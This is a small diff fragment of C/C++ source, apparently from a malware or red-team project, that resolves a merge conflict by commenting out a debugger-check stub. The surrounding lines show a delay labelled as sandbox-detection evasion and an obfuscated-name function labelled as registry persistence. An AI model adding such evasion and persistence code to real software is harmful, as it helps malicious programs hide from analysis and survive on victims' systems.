@@ -7,16 +7,13 @@
 const unsigned short TIME_TO_WAIT = 1000; // Avoid Sandbox detection
 
 // Check the Process Environment Block
-<<<<<<< HEAD
-BOOL CheckDebugger() {
+/*BOOL CheckDebugger() {
     return TRUE;
-}
-=======
+}*/
 /*BOOL CheckDebugger() {
     return TRUE;
 }*/
 
->>>>>>> f180b86 (Name changes)
 // Edit Registry for persistence
 void b7nmffhhcb55ps4() {
     HKEY hKey = { 0 };
